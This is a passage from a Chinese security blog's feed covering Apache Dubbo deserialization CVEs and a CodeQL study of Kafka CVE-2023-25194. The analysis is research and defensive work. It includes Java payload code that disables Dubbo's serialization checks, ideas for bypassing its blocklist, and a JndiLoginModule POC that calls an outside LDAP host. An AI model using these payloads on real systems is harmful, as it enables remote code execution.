漏洞分析</h3><p>师傅们的思路：</p><ol><li><strong>将Configuration 的dubbo.security.serialize.generic.native-java-enable 属性设置为True ，启用JavaNative</strong></li><li><strong>将SerializeClassChecker 的INSTANCE 属性更改为我们自定义的SerializeClassChecker，然后在这个自定义的checker 中，将JdbcRowSetImpl 加到白名单里面，或者将黑名单置空，或者将OPEN_CHECK_CLASS 更改为 false，从而绕过这个检查机制。</strong></li></ol><h4 id="16-3-1-org-apache-dubbo-common-utils-ConfigUtils"><a href="#16-3-1-org-apache-dubbo-common-utils-ConfigUtils" class="headerlink" title="16.3.1 org.apache.dubbo.common.utils.ConfigUtils"></a>16.3.1 org.apache.dubbo.common.utils.ConfigUtils</h4><h5 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 泛型调用第三个参数  参数对象</span></span><br><span class="line">Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">p.setProperty(<span class="string">&quot;dubbo.security.serialize.generic.native-java-enable&quot;</span>, String.valueOf(<span class="keyword">true</span>));</span><br><span class="line">JavaBeanDescriptor descriptor = <span class="keyword">new</span> JavaBeanDescriptor(<span class="string">&quot;org.apache.dubbo.common.utils.ConfigUtils&quot;</span>,<span class="number">7</span>);</span><br><span class="line">descriptor.setProperty(<span class="string">&quot;properties&quot;</span>, p);</span><br><span class="line">out.writeObject(<span class="keyword">new</span> Object[]&#123;descriptor&#125;);</span><br><span class="line"><span class="comment">// attachment</span></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">&quot;generic&quot;</span>, <span class="string">&quot;bean&quot;</span>);</span><br><span class="line">out.writeObject(map);</span><br></pre></td></tr></table></figure><h5 id="raw-return"><a href="#raw-return" class="headerlink" title="raw.return"></a>raw.return</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 泛型调用第三个参数  参数对象</span></span><br><span class="line">Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">p.setProperty(<span class="string">&quot;dubbo.security.serialize.generic.native-java-enable&quot;</span>, String.valueOf(<span class="keyword">true</span>));</span><br><span class="line">HashMap jndi = <span class="keyword">new</span> HashMap();</span><br><span class="line">jndi.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;org.apache.dubbo.common.utils.ConfigUtils&quot;</span>);</span><br><span class="line">jndi.put(<span class="string">&quot;properties&quot;</span>, p);</span><br><span class="line">out.writeObject(<span class="keyword">new</span> Object[]&#123;jndi&#125;);</span><br><span class="line"><span class="comment">// attachment</span></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">&quot;generic&quot;</span>, <span class="string">&quot;raw.return&quot;</span>);</span><br><span class="line">out.writeObject(map);</span><br></pre></td></tr></table></figure><p>如何定位到ConfigUtils</p><p><img src="/images/pasted-497.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getInternalProperty:62, PropertiesConfiguration (org.apache.dubbo.common.config)</span><br><span class="line">getProperty:122, Configuration (org.apache.dubbo.common.config)</span><br><span class="line">getProperty:109, Configuration (org.apache.dubbo.common.config)</span><br><span class="line">getInternalProperty:102, CompositeConfiguration (org.apache.dubbo.common.config)</span><br><span class="line">getProperty:124, CompositeConfiguration (org.apache.dubbo.common.config)</span><br><span class="line">getProperty:109, Configuration (org.apache.dubbo.common.config)</span><br><span class="line">convert:142, Configuration (org.apache.dubbo.common.config)</span><br><span class="line">getBoolean:86, Configuration (org.apache.dubbo.common.config)</span><br><span class="line">getBoolean:81, Configuration (org.apache.dubbo.common.config)</span><br><span class="line">invoke:115, GenericFilter (org.apache.dubbo.rpc.filter)</span><br></pre></td></tr></table></figure><h4 id="16-3-2-SerializeClassChecker"><a href="#16-3-2-SerializeClassChecker" class="headerlink" title="16.3.2 SerializeClassChecker"></a>16.3.2 SerializeClassChecker</h4><p>覆盖SerializeClassChecker INSTANCE</p><h3 id="16-4-其他"><a href="#16-4-其他" class="headerlink" title="16.4 其他"></a>16.4 其他</h3><ol><li>3.1.5 ConfigUtils 已经没有PROPERTIES</li></ol><h2 id="0x17-总结与思考"><a href="#0x17-总结与思考" class="headerlink" title="0x17 总结与思考"></a>0x17 总结与思考</h2><h3 id="17-1-安全策略"><a href="#17-1-安全策略" class="headerlink" title="17.1 安全策略"></a>17.1 安全策略</h3><ul><li>serialize.blockedlist 安全策略    </li><li>checkSerialization 安全策略    </li><li>DENY_CLASS 安全策略</li></ul><table><thead><tr><th>策略</th><th>功能</th><th>引入版本</th><th>其他</th></tr></thead><tbody><tr><td>serialize.blockedlist</td><td>针对动态调用$invoke，PoJO、JavaBean等处理attachement时的黑白名单</td><td><a href="#0x07-CVE-2021-30179">CVE-2021-30179</a></td><td>在<a href="0x16-CVE-2023-23638">CVE-2023-23638</a>中被绕过</td></tr><tr><td>checkSerialization</td><td>检验传入的serialize 方式是否和配置相同</td><td>可能是<a href="0x05-CVE-2021-25641">CVE-2021-25641</a>引入的<br>具体在2.6.10.1版本引入，但是默认不开启<br>TODO：具体哪个版本默认开启的尚未跟踪</td><td><a href="#0x14-CVE-2021-37579">CVE-2021-37579</a>中被绕过</td></tr><tr><td>DENY_CLASS</td><td>Hessian 反序列化黑白名单</td><td><a href="#0x15-CVE-2021-43297">CVE-2021-43297</a>补丁引入<br>2.7.14版本在com.alibaba.com.caucho.hessian.io.ClassFactory中添加了黑名单，通过包命和类名过滤将要创建的对象，而Hessian2反序列化创建对象时，都需要使用ClassFactory这个工厂类</td><td><a href="0x06-GHSL-2021-036">GHSL-2021-036</a> 中特别多的触发点，一直到这个版本才修</td></tr></tbody></table><h3 id="17-2-思考"><a href="#17-2-思考" class="headerlink" title="17.2 思考"></a>17.2 思考</h3><ol><li>path 分析思路要清晰</li><li>GHSL-2021-036 的NOK RPC路径和CVE-2021-43297 不能说是异曲同工，只能说是一模一样</li></ol><h2 id="0x18-参考"><a href="#0x18-参考" class="headerlink" title="0x18 参考"></a>0x18 参考</h2><ul><li>[1] <a href="https://xz.aliyun.com/t/10916">Java安全-Dubbo (by:j1ang)</a></li><li>[2] <a href="https://securitylab.github.com/research/apache-dubbo/">Apache Dubbo: All roads lead to RCE</a></li><li>[3] <a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve">GHSL-2021-034_043: Multiple pre-auth RCEs in Apache Dubbo - CVE-2021-25641, CVE-2021-30179, CVE-2021-30180, CVE-2021-30181, CVE-2021-32824</a></li><li>[4] <a href="https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/">GHSL-2021-094: Multiple RCEs in Apache Dubbo - CVE-2021-36162, CVE-2021-36163</a></li><li>[5] <a href="https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/">GHSL-2021-097: Pre-Auth Unsafe Java Deserialization in Apace Dubbo - CVE-2021-37579</a></li><li>[6] <a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html">[CVE-2019-17564] Apache Dubbo deserialization vulnerability</a></li><li>[7] <a href="https://paper.seebug.org/1814/">Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297）(by:Longofo)</a></li><li>[8] <a href="https://github.com/bitterzzZZ/CVE-2021-43297-POC">bitterzzZZ/CVE-2021-43297-POC</a></li><li>[9] <a href="https://www.cnblogs.com/bitterz/p/15828415.html">通过CVE-2021-43297漏洞在Apache Dubbo&lt;=2.7.13下实现RCE (by:bitterz)</a></li><li>[10] <a href="https://xz.aliyun.com/t/12333">Apache Dubbo CVE-2023-23638 JavaNative 反序列化漏洞分析 (by:jweny)</a></li><li>[11] <a href="https://mp.weixin.qq.com/s/ntHaqIhVTyTiGCHa9DW6qw">【技术分析】剖析Apache Dubbo 反序列化远程代码执行漏洞（CVE-2023-23638）</a></li><li>[12] <a href="https://exp10it.cn/2023/03/apache-dubbo-cve-2023-23638-%E5%88%86%E6%9E%90/">Apache Dubbo CVE-2023-23638 分析 (by:X1r0z)</a></li><li>[13] <a href="https://xz.aliyun.com/t/12396">Apache dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索</a></li><li>[14] <a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%89%8D%E8%A8%80">FastJson与原生反序列化</a></li><li>[15] <a href="https://y4er.com/posts/apache-dubbo-cve-2019-17564/">Apache Dubbo CVE-2019-17564 反序列化分析 (by:Y4er)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;链接&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;影响版本&lt;/th&gt;
&lt;th&gt;作者&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x02-CVE-2019-17564&quot;&gt;CVE-2019-17564&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;http协议，直接使用了Spring框架的&lt;code&gt;HttpInvokerServiceExporter&lt;/code&gt;类做远程调用，而这个过程会读取POST请求的Body并进行反序列化&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.4&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.7&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://lists.apache.org/thread/lgk1xhlgb8t3dmlw10rx7drxs00yspd2&quot;&gt;Dor Tumarkin@Chekmarx&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x03-CVE-2020-1948&quot;&gt;CVE-2020-1948&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Dubbo默认hessian进行反序列化，未验证参数类型，任意object参数都会进行反序列化，实际修复不完整&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.6&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.7&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html&quot;&gt;Ruilin&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x04-CVE-2020-11995&quot;&gt;CVE-2020-11995&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;CVE-2020-1948 的绕过，参数类型验证保留了动态调用，$invoke&#92;$invokeAsync&#92;$echo 三个方法的参数仍然可例用，补丁修复仍然不全&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-1-bypass-cve-2020-1948-mitigations-ghsl-2021-034&quot;&gt;GHSL-2021-034&lt;/a&gt;、&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/&quot;&gt;GHSL-2021-097&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.8&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.8&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x05-CVE-2021-25641&quot;&gt;CVE-2021-25641&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-2-bypass-hessian2-allowlist-via-alternative-protocols-ghsl-2021-035&quot;&gt;GHSL-2021-035&lt;/a&gt; Dubbo除了支持hessian协议，还支持其他总共14协议，这些协议里面也有反序列化问题&lt;/td&gt;
&lt;td&gt;dubbo-common&amp;lt;=2.7.3&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.8&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.8&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x06-GHSL-2021-036&quot;&gt;GHSL-2021-036&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-3-pre-auth-rce-via-multiple-hessian-deserializations-in-the-rpc-invocation-decoder-ghsl-2021-036&quot;&gt;GHSL-2021-036&lt;/a&gt; Dubbo中数据流有很多途径到达hessian#readObject，pwntester首次在这里提出这条链readUTF-&amp;gt;readString-&amp;gt;expect-&amp;gt;readObject，这个和后续的CVE-2021-43297异曲同工，而且更短&lt;/td&gt;
&lt;td&gt;3.0.0&amp;lt;=Dubbo&amp;lt;=3.0.5&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.15&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.12&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x07-CVE-2021-30179&quot;&gt;CVE-2021-30179&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-4-pre-auth-rce-via-java-deserialization-in-the-generic-filter-ghsl-2021-037&quot;&gt;GHSL-2021-037&lt;/a&gt;/&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-5-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-generic-filter-ghsl-2021-038&quot;&gt;GHSL-2021-038&lt;/a&gt; Dubbo支持动态调用，有几个特殊的函数：$invoke&#92;$invokeAsync&#92;$echo，这几个的逻辑在GenericFilter 中，这几个函数支持特定格式的参数，在还原和处理这几个函数时，支持pojo、bean、javanative等方式，会有setter/反序列化问题&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.9&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.9&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x08-CVE-2021-32824&quot;&gt;CVE-2021-32824&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-6-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-telnet-handler-ghsl-2021-039&quot;&gt;GHSL-2021-039&lt;/a&gt; Dubbo支持Telnet，包括invoke 调用，原理和CVE-2021-30179 PojoUtils 利用类似&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.9&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.9&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x09-CVE-2021-30180&quot;&gt;CVE-2021-30180&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;1. &lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-7-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-040&quot;&gt;GHSL-2021-040&lt;/a&gt;/&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-8-rce-on-customers-via-condition-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-041&quot;&gt;GHSL-2021-041&lt;/a&gt; Dubbo的路由实现支持多种，例如Tag路由、Condition路由，它两都支持动态配置，具体实现是以yml格式写入kafka配置中，再交由consumer去解析，consumer采用的是snakeyaml，存在反序列化漏洞。&lt;br&gt;2. &lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-10-rce-on-providers-via-configuration-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-043&quot;&gt;GHSL-2021-043&lt;/a&gt;: Dubbo还支持动态配置，原理与router config类似，不过是由provider来加载，最终调用snakeyaml实现反序列化。&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.9&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.9&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x10-CVE-2021-30181&quot;&gt;CVE-2021-30181&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-9-rce-on-customers-via-script-route-poisoning-nashorn-script-injection-ghsl-2021-042&quot;&gt;GHSL-2021-042&lt;/a&gt; 与上一个漏洞类似，还支持Script路由，Script引擎用的Nashorn，存在命令执行&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.9&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.9&lt;br&gt;2.5.x&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x11-CVE-2021-36162&quot;&gt;CVE-2021-36162&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-1-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-094&quot;&gt;GHSL-2021-094&lt;/a&gt; Dubbo在2.7.10中修复了snakeYaml的反序列化问题，但是3.0新Router机制Mesh中依然存在snakeYaml反序列化&lt;/td&gt;
&lt;td&gt;3.0&amp;lt;=Dubbo&amp;lt;=3.0.1&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.12&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x12-CVE-2021-36163&quot;&gt;CVE-2021-36163&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-2-unsafe-deserialization-in-providers-using-the-hessian-protocol-ghsl-2021-095&quot;&gt;GHSL-2021-095&lt;/a&gt; Dubbo还支持Hessian协议（并不是指反序列化），基于http，在HessianSkeleton 的处理中会对POST 的内容进行反序列化&lt;/td&gt;
&lt;td&gt;3.0&amp;lt;=Dubbo&amp;lt;=3.0.1&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.12&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x13-GHSL-2021-096&quot;&gt;GHSL-2021-096&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/#issue-3-unsafe-deserialization-in-providers-using-the-rmi-protocol-ghsl-2021-096&quot;&gt;GHSL-2021-096&lt;/a&gt; Dubbo还支持rmi协议，Dobbo的Provider类似RMI的Register和Provider，可以用Client攻击Register和Provider的方式进行攻击&lt;/td&gt;
&lt;td&gt;3.0&amp;lt;=Dubbo&amp;lt;=3.0.1&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.12&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x14-CVE-2021-37579&quot;&gt;CVE-2021-37579&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/&quot;&gt;GHSL-2021-097&lt;/a&gt; CodecSupport#checkSerialization bypass，该安全策略用于判断dubbo数据包指定的序列化方式是否是provider配置的配置，当version不存在时，会绕过检测漏洞&lt;/td&gt;
&lt;td&gt;3.0&amp;lt;=Dubbo&amp;lt;=3.0.1&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.12&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#cve&quot;&gt;Alvaro Munoz@GitHub Security Lab&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x15-CVE-2021-43297&quot;&gt;CVE-2021-43297&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;hessian-lite 作为dubbo内置的hessian版本，在处理异常的时候，会通过”+”进行字符串拼接，导致其中obj的toString 隐式调用，形成反序列化(也可以认为是&lt;a href=&quot;#0x06-GHSL-2021-036&quot;&gt;GHSL-2021-036&lt;/a&gt;的补充)&lt;/td&gt;
&lt;td&gt;3.0.0&amp;lt;=Dubbo&amp;lt;=3.0.5&lt;br&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.15&lt;br&gt;2.6.0&amp;lt;=Dubbo&amp;lt;=2.6.12&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://lists.apache.org/thread/1mszxrvp90y01xob56yp002939c7hlww&quot;&gt;cxc、yhbl、wh1t3p1g、fynch3r&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a href=&quot;#0x16-CVE-2023-23638&quot;&gt;CVE-2023-23638&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;CVE-2021-30179的绕过，可以利用setter设置全局静态配置变量，绕过安全规则&lt;/td&gt;
&lt;td&gt;2.7.0&amp;lt;=Dubbo&amp;lt;=2.7.21&lt;br&gt;3.0.0&amp;lt;=Dubbo&amp;lt;=3.0.13&lt;br&gt;3.1.0&amp;lt;=Dubbo&amp;lt;=3.1.5&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://lists.apache.org/thread/8h6zscfzj482z512d2v5ft63hdhzm0cb&quot;&gt;yemoli、R1ckyZ、Koishi、cxc (reporter)&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Dubbo" scheme="http://m0d9.me/tags/Dubbo/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 分析Apache Kafka CVE-2023-25194</title>
    <link href="http://m0d9.me/2023/03/01/CodeQL-%E5%88%86%E6%9E%90Apache-Kafka-CVE-2023-25194/"/>
    <id>http://m0d9.me/2023/03/01/CodeQL-%E5%88%86%E6%9E%90Apache-Kafka-CVE-2023-25194/</id>
    <published>2023-03-01T08:48:00.000Z</published>
    <updated>2023-08-31T02:35:31.795Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2023-25194 是jaas 的通用问题，如果可以自定义jaas config，就可以触发漏洞。是否能够通过自动化发现该漏洞？如果可能，那么也就可以自动化横向分析类似问题。</p><p>本文假设读者师傅们已经能够简单使用codeql，比如codeql的source\sink概念，以及data-flow污点分析及其isAdditionalTaintStep的使用。</p><h2 id="0x01-CVE-2023-25194"><a href="#0x01-CVE-2023-25194" class="headerlink" title="0x01 CVE-2023-25194"></a>0x01 CVE-2023-25194</h2><p>POC:<br><code>com.sun.security.auth.module.JndiLoginModule required user.provider.url=&quot;ldap://kafka2.1.dns.m0d9.me </code></p><a id="more"></a><h3 id="1-1-LoginContext"><a href="#1-1-LoginContext" class="headerlink" title="1.1 LoginContext"></a>1.1 LoginContext</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginContext</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Configuration config;</span><br><span class="line">    <span class="keyword">private</span> ModuleInfo[] moduleStack;</span><br><span class="line"><span class="comment">// 注意参数config，最终会流向JndiLoginModule#userProvider，作为ctx.lookup参数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LoginContext</span><span class="params">(String name, Subject subject,</span></span></span><br><span class="line"><span class="function"><span class="params">                        CallbackHandler callbackHandler,</span></span></span><br><span class="line"><span class="function"><span class="params">                        Configuration config)</span> <span class="keyword">throws</span> LoginException </span>&#123;</span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">...</span><br><span class="line">        init(name);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(String name)</span> <span class="keyword">throws</span> LoginException </span>&#123;</span><br><span class="line">        AppConfigurationEntry[] entries = config.getAppConfigurationEntry(name);</span><br><span class="line">        ...</span><br><span class="line">        moduleStack = <span class="keyword">new</span> ModuleInfo[entries.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; entries.length; i++) &#123;</span><br><span class="line">            <span class="comment">// clone returned array</span></span><br><span class="line">            moduleStack[i] = <span class="keyword">new</span> ModuleInfo</span><br><span class="line">                                (<span class="keyword">new</span> AppConfigurationEntry</span><br><span class="line">                                        (entries[i].getLoginModuleName(),</span><br><span class="line">                                        entries[i].getControlFlag(),</span><br><span class="line">                                        entries[i].getOptions()),</span><br><span class="line">                                <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException 